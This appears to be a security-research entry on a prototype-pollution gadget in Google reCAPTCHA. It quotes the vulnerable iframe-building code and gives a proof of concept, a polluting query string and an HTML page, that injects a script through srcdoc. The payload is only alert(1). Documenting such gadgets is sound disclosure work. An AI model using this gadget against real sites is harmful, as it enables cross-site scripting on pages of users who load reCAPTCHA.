## Google reCAPTCHA

URL: https://www.google.com/recaptcha/about/

### Vulnerable code fragment
https://www.gstatic.com/recaptcha/releases/Y5tQ3lKwn1XL5hGgLz1kR4-1/recaptcha__en.js
```js
return m - 7 & 6 || (d.F = l[25](5, Z, 0, {
    src: I,
    tabindex: K,
    width: String(U.width),
    height: String(U.height),
    role: "presentation",
    name: E + d.Y
  }),
  x.appendChild(d.F))
```

### PoC

```
?__proto__[srcdoc][]=<script>alert(1)</script>
```

```html
<script src="https://www.google.com/recaptcha/api.js" async defer></script>
<script>
  Object.prototype.srcdoc=['<script>alert(1)<\/script>']
</script>
<div class="g-recaptcha" data-sitekey="your-site-key"/>
```
